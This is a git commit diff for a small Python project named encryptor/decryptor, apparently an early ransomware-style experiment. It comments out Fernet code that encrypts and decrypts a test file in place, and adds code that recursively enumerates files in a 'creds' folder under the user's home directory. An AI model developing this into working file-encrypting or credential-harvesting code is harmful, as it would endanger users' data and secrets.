e80bf81fbbff9d7c9295940fe02ca3c24bf32ade
warhoax <iwarhoax@gmail.com>
2022-08-04 04:33:51 -0700

    1

--- decryptor.py
+++ decryptor.py
@@ -1,14 +1,14 @@
-from cryptography.fernet import Fernet
 
-with open("key.key", "rb") as kf:
-    key = kf.read()
+#with open("key.key", "rb") as kf:
+#    key = kf.read()
 
-fernet = Fernet(key)
+#fernet = Fernet(key)
 
-with open("test.txt","rb") as tf:
-    tf_bytes = tf.read()
+#with open("test.txt","rb") as tf:
+#    tf_bytes = tf.read()
 
-    tf_bytes_dec = fernet.decrypt(tf_bytes)
+#    tf_bytes_dec = fernet.decrypt(tf_bytes)
 
-with open("test.txt","wb") as tf:
-    tf.write(tf_bytes_dec)
+#with open("test.txt","wb") as tf:
+#    tf.write(tf_bytes_dec)
+
--- encryptor.py
+++ encryptor.py
@@ -1,17 +1,25 @@
 from cryptography.fernet import Fernet
+import os
+import glob
 
-key = Fernet.generate_key()
+#key = Fernet.generate_key()
 
-with open("key.key", "wb") as keyFile:
-    keyFile.write(key)
+#with open("key.key", "wb") as keyFile:
+ #   keyFile.write(key)
 
-fernet = Fernet(key)
+#fernet = Fernet(key)
 
-with open("test.txt", "rb") as tf:
-    tf_byte = tf.read()
+#with open("test.txt", "rb") as tf:
+ #   tf_byte = tf.read()
 
-tf_bytes_enc = fernet.encrypt(tf_byte)
+#tf_bytes_enc = fernet.encrypt(tf_byte)
 
-with open("test.txt", "wb") as tf:
-     tf.write(tf_bytes_enc)
+#with open("test.txt", "wb") as tf:
+ #    tf.write(tf_bytes_enc)
 
+home_dir =  os.path.expanduser("~")
+#print(home_dir)
+files = glob.glob(f'{home_dir}\\creds\\**\\*.*', recursive=True)
+
+for file in files:
+    print(file)
